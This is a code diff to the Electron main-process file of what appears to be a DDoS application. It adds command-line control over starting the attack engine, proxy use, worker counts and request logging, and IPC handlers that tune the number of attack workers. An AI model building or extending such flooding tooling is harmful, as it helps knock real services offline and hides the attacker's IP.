@@ -3,6 +3,7 @@ import path from 'path'
 import os from 'os'
 
 import { Engine } from '../src-worker/engine'
+import { parseArguments } from '../src-lib/context'
 
 import { trackEvent, usr } from './analytics'
 
@@ -72,13 +73,26 @@ function createWindow () {
   } catch (e) { console.log(e) }}
   , 90000)
 
+  const arg = parseArguments()
+
   const engine = new Engine()
-  engine.setExecutorStartegy('automatic')
+  engine.config.useRealIP = !arg.withProxy
+  engine.config.logRequests = arg.logRequests
+  engine.config.logTimestamp = arg.logTimestamp
+  engine.setExecutorStartegy(arg.planer)
+  engine.executionStartegy.setExecutorsCount(arg.workers)
+  if (engine.executionStartegy.type === 'automatic') {
+    engine.executionStartegy.setMaxExecutorsCount(arg.maxWorkers)
+  }
 
   const window = mainWindow
   engine.executionStartegy.on('atack', (data) => window.webContents.send('atack', data))
   engine.executionStartegy.on('error', (data) => window.webContents.send('error', data))
   engine.executionStartegy.on('automatic_executorsCountUpdate', (data) => window.webContents.send('executorsCountUpdate', data))
+
+  mainWindow.webContents.on('did-finish-load', () => {
+    window.webContents.send('programArgs', arg)
+  })
 
   // const doser = new Doser(true, 32)
   // const window = mainWindow
@@ -87,7 +101,9 @@ function createWindow () {
   // doser.listen('error', (data) => window.webContents.send('error', data))
   // doser.start()
 
-  engine.start()
+  if (arg.startDDoS) {
+    engine.start()
+  }
 
   ipcMain.on('updateDDOSEnable', (event, arg) => {
     if (arg.newVal) {
@@ -108,8 +124,16 @@ function createWindow () {
     engine.executionStartegy.on('automatic_executorsCountUpdate', (data) => window.webContents.send('executorsCountUpdate', data))
   })
 
-  ipcMain.on('updateMaxDosersCount', (event, arg) => {
-    engine.executionStartegy.setExecutorsCount(arg.newVal)
+  ipcMain.on('updateMaxWorkersCount', (event, arg) => {
+    if (engine.executionStartegy.type === 'automatic') {
+      engine.executionStartegy.setMaxExecutorsCount(arg.newVal)
+    }
+  })
+
+  ipcMain.on('updateWorkersCount', (event, arg) => {
+    if (engine.executionStartegy.isRunning) {
+      engine.executionStartegy.setExecutorsCount(arg.newVal)
+    }
   })
 
   ipcMain.on('installUpdate', () => {
